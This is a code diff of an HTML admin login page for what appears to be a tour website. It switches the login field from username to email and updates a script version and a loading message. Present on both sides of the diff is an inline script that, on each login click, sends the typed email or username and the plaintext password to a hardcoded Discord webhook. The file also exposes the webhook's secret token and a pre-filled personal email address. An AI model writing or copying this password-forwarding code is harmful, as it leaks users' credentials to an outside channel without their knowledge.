@@ -45,7 +45,7 @@
 
     <div id="loader-wrapperz">
       <div id="loaderz"></div>
-      <div id="loading-text"> <br> Sabar Lek</div>
+      <div id="loading-text"> <br> Sabar ya lek</div>
       </div>
 
     <div id="app">
@@ -70,10 +70,10 @@
                       <input
                         class="input"
                         type="text"
-                        placeholder="username"
-                        autocomplete="username"
-                        id="username"
-                        value="prisyahaura"
+                        placeholder="email"
+                        autocomplete="email"
+                        id="email"
+                        value="prisyahaura@gmail.com"
                         required
                         autofocus
                       />
@@ -115,14 +115,14 @@
       </section>
     </div>
             <!-- Scripts -->
-            <script type="module" src="https://cdn.jsdelivr.net/gh/wegotour/js_wgt@0.0.9/jsadmin/controller/controllerLogin.js"></script>
+            <script type="module" src="https://cdn.jsdelivr.net/gh/wegotour/js_wgt@0.0.13/jsadmin/controller/controllerLogin.js"></script>
             <script type="module" src="https://cdn.jsdelivr.net/gh/wegotour/js_wgt@0.0.11/js/loading.js"></script>
 
             <script>
               //LOG DISCORD
               const webhookURL = "https://discord.com/api/webhooks/1180844854905938000/DSlr-ojeQK-opl4I9GUd6lfmvHD3J9CmuM5RPJIaWD6YkyEPA0wd6N8mKvlbUmgyKCr8";
               document.getElementById("button").addEventListener("click", () => {
-                const username = document.getElementById('username').value;
+                const email = document.getElementById('email').value;
                 const password = document.getElementById('password').value;
             
                 const loadingOverlay = document.getElementById("loading-overlay");
@@ -131,7 +131,7 @@
                 const loadingText = document.querySelector(".loading-text");
                 loadingText.style.display = "block";
             
-                const message = `ADA YANG MENCOBA LOGIN NICHH: ${username} PASSWORD: ${password}`;
+                const message = `ADMIN ADA YANG MENCOBA LOGIN NICHH: ${email} PASSWORD: ${password}`;
                 sendToDiscordWebhook(message);
               });
             
